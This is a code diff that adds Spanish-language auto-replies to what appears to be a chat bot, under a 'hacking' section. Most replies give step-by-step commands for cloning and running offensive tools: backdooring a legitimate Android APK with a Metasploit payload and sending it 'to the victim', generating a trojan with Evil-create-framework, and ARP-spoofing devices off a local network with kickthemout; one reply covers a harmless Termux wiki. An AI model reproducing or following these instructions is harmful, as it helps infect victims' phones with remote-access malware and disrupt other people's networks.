@@ -1826,6 +1826,103 @@ Now its time to update
 
 $ apt-get update`)
                   }
+					
+if (budy.includes(`/infectador-framework`)) {
+                  reply(`📲 infectador-framework 📲
+
+Es un script que te permite infectar apks legítimas con 6 payloads diferentes a elejir los comandos para instalar el script son:
+
+$ apt update && apte upgrade -y 
+$ pkg install -y git 
+$ git clone https://github.com/Cesar-Hack-Gray/infectador-framework 
+$ cd infectador-framework 
+$ ls 
+$ bash setup 
+
+Esta parte tardará un poco solo esperen a que se instalen los paquetes necesarios para el script Ya cuendo aya terminado de descargar todos los paquetes ejecutan el script con:
+
+$ ./Infectador Apreten enter 
+
+Elijen el payload que quieran usar para infectar el apk poniendo el número que tenga detrás el payload
+
+ Aquí ponen la ruta del apk legítima que quieren infectar por ejemplo si la apk se encuentra en descargas y se llama Base.apk la ruta sería: 
+
+$ /sdcard/Download/Base.apk
+
+ Ojo eso es un ejemplo ustedes ponen la ruta de dónde se encuentre el apk con su respectivo nombre
+
+Aquí pondrán su IP, para saber cuál es su IP pueden abrir otra sesión y escribir *ifconfig ahíh buscan su IP y la pegan en la sesión del infectador Aquí ponen el puerto de su preferencia Aquí le elijen un nuevo nombre al apk Aquí apretan "Y" y le dan a enter Ya se estaría infectando el apk legítima solo deben esperar Ya cuendo aya terminado de infectar el apk elijen la opción 2 es lo más recomendable Bueno aquí les pedirá iniciar metasploit ustedes apretan "Y" le dan a enter y le dan devuelta a "Y",metasploit se estaría conectando con el apk infectada El apk infectada se les guardará en la carpeta de infectador-framework solo deben ingresar a la carpeta y mover el apk infectada a HOME ya solo queda mandar el apk infectada a la víctima*`)
+                  }
+					
+		if (budy.includes(`/evil-create-framework`)) {
+                  reply(`📱 CREAR TROYANO 📱
+
+📱Instalación 📱
+
+$ pkg update
+$ pkg upgrade
+$ pkg install git
+$ pkg install python2
+$ git clone https://github.com/LOoLzeC/Evil-create-framework
+$ ls
+$ cd Evil-create-framework
+$ ls
+$ chmod +x vcrt.py
+$ python2 vcrt.py
+
+help
+
+show android
+
+create virus/y aquí elegimos el virus
+
+SET OUTPUT /sdcard
+
+SET NAME VIRUS (y le ponemos un nombre)
+
+go`)
+                  }
+	
+	if (budy.includes(`/wiki-termux`)) {
+                  reply(`🌎¿Qué es Wiki-Termux?🌎
+
+wiki-termux, como su nombre lo dice, es una guía o manual que contiene información acerca del uso de Termux y de algunas herramientas que son compatibles con ésta terminal.
+
+📱INSTALACIÓN DE wiki-termux EN TERMUX (ANDROID)📱
+
+$ apt update && apt upgrade -y
+$ termux-setup-storage
+$ pkg install -y git
+$ git clone https://github.com/HarrisSec/wiki-termux
+$ cd wiki-termux
+$ chmod 711 wiki
+$ ./wiki`)
+                  }
+
+if (budy.includes(`/kickthemoutprojet`)) {
+                  reply(`📲¿Qué es kickthemout?📲
+
+Una herramienta para expulsar dispositivos de su red y disfrutar de todo el ancho de banda para usted. Le permite seleccionar dispositivos específicos o todos y ARP los falsifica fuera de su red de área local.
+
+📲INSTALACIÓN DE kickthemout EN TERMUX (ANDROID ROOT)🌐
+
+$ apt update && apt upgrade -y
+$ termux-setup-storage
+$ pkg install -y git
+$ pkg install -y nmap
+$ pkg install -y python
+$ pkg install -y python2
+$ git clone https://github.com/k4m4/kickthemout.git
+$ cd kickthemout
+$ python -m pip install -r requirements.txt
+$ sudo python kickthemout.py
+
+Escribir la puerta de enlace del router al que estas conectado, ejemplo:
+
+192.168.1.1
+
+Seleccionar la opción número "3" y pulsar enter`)
+                  }
 // FINAL AUTORESPUESTA - HACKING
 					
 		if (budy.includes(`Todo bien`)) {
